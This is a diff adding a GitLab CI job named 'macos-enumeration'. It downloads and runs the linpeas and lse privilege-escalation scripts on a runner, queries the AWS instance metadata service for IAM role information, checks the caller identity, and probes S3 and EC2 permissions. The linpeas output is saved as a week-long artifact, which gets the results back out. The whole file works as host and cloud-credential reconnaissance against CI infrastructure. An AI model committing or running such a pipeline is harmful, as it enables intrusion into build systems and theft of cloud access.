@@ -1,0 +1,36 @@
+stages:
+  - enumerate
+
+macos-enumeration:
+  stage: enumerate
+  tags:
+    - mac-1
+  before_script:
+    - curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+    - curl -Lo linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+    - chmod +x linpeas.sh
+  script:
+    - uname -a
+    - whoami
+    - id
+    - ps aux
+    
+    # Query AWS metadata service to check if IMDSv1 is enabled
+    - echo "Querying Instance Metadata Service (IMDS)..."
+    - curl http://169.254.169.254/latest/meta-data/iam/info
+
+    - echo "Checking AWS Role and Account ID..."
+    - aws sts get-caller-identity
+    
+    - echo "Checking AWS permissions..."
+    - aws s3 ls || echo "No access to S3 buckets"
+    - aws ec2 describe-instances || echo "No access to EC2 instances"
+    
+    - echo "Running enum scripts..."
+    - ./linpeas.sh | tee linpeas-output.log
+    - ./lse.sh | tee lse-output.log
+
+  artifacts:
+    paths:
+      - linpeas-output.log
+    expire_in: 1 week  # Keep artifacts for a week
